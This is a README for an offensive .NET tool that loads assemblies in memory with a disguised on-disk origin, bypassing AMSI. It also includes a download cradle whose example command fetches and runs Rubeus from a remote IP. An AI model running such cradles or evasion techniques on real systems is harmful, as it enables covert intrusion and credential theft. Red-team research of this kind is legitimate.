# SharpTransactedLoad
Load .net assemblies from memory while having them appear to be loaded from an on-disk location. Bypasses AMSI and expands the number of methods available for use in loading arbitrary assemblies while still avoiding dropping files to disk - some of which provide additional functionality over the traditional Assembly.Load call.  Currently built for .net 4.5, but should be compatibile with other versions.

## Building and Using
**Note**: Testing was done with an x64 build, and as a result I would recommend building the project as x64. This still allows you to reflectively load both x86 and x64 assemblies from memory, this just controls the architecture of the dll itself. Although "Any CPU" appears to function as intended as well, I have no clue if any weird behavior would be exhibited when attempting to inject into an x86 process etc.

This repo consists of two projects: SharpTransactedLoad (STL) and SharperCradle.  STL contains the actual code and compiles to a .dll that can then be used in other projects.  SharperCradle is a very simple proof of concept web download cradle showing how STL can be used in a portable tool to avoid having to call Assembly.Load(byte[]).  Both projects use Costura to merge all the necessary DLLs into a single portable package.

### SharpTransactedLoad
This project builds as a DLL, and as a result it isnt something that can be directly ran.  Rather, once this is built you can add it as a reference in another project and use it by calling "STL.TransactedAssembly.Load(byte[])"
STL uses EasyHook for hooking functions.  Within the project there are currently two required EasyHook DLLs:
  - **EasyHook.dll**: sits in the SharpTransactedLoad/SharpTransactedLoad/ folder.  This is a managed DLL and handles communications with the second (unmanaged) EasyHook dll.
  - **EasyHook64.dll**: sits in the SharpTransactedLoad/SharpTransactedLoad/Costura64 folder.  This is an unmanaged DLL, and handles the actual hooking functions.
Both of these DLL's were taken straight from EasyHook, but I definitely understand folks hesitancy to blindly trust pre-compiled code.  If you opt for the more opsec route, the original DLLs can be pulled directly from EasyHook and swapped for the ones currently in the project, just make sure names align.  Also, when browsing the project you may notice the Costura32 folder does not have anything in it.  If you opt to build as x86, I would drop the DLL in there.

**Build instructions:**
  - Clean the solution to re-populate all necessary Costura + Fody packages. In Visual Studio, go 'Build' -> 'Clean Solution'.
  - (Recommended) Set your platform to x64.  In Visual Studio, select x64 from the 'Solution Platforms' dropdown near the top of the screen (likely currently set to 'Any CPU').
  - (Optional) Change deployment config to Debug or Release, as suits your needs.  Debug will print a bunch of output to the console when an assembly is loaded regarding the results of the different steps in the process, whereas release runs without printing anything.
  - Build the solution In Visual Studio, go 'Build' -> 'Build Solution'.

### SharperCradle
This serves as a PoC of how STL can be used in a project to avoid the standard Assembly.Load(byte[]) call.  Builds as a PE.

**Build instructions:**
  - Clean the solution to re-populate all necessary Costura + Fody packages. In Visual Studio, go 'Build' -> 'Clean Solution'.
  - (Required if you built STL as x64) Set your platform to x64.  In Visual Studio, select x64 from the 'Solution Platforms' dropdown near the top of the screen (likely currently set to 'Any CPU').
  - Build the solution In Visual Studio, go 'Build' -> 'Build Solution'.
  
Once built, calling is super basic - just pass the uri of the resource you're attempting to load as the first arg, with any args to be passed to the loaded assembly behind that, for example:

```
SharperCradle.exe http://192.168.1.100/Rubeus.exe Triage
```

## Credits
  - @FuzzySec: Prior work on hooking with EasyHook (specifically Dendrobate) and outline that this project followed: 
  - @Anthemtotheego: Guidance on Transactional NTFS + SharpCradle, which the SharperCradle PoC was based off of: 